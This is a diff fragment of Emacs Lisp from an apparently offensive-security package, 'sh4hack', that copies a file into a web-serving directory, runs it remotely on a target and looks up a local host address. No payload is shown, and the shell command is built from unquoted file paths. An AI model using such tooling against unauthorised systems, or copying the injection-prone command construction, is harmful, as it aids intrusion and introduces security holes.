+    (if (not (string-empty-p (sh (format "{ ls %s/%s && echo 'File already exists.'; } || cp %s %s" sh4h-www-dir file path sh4h-www-dir))))
+	(message "")
+      (if (y-or-n-p "Output into local file?: ")
+	  (run-remotely-and-output-locally term file)
+	(run-remotely term file)))))
+
+(get-lhost)
 (provide 'sh4hack)
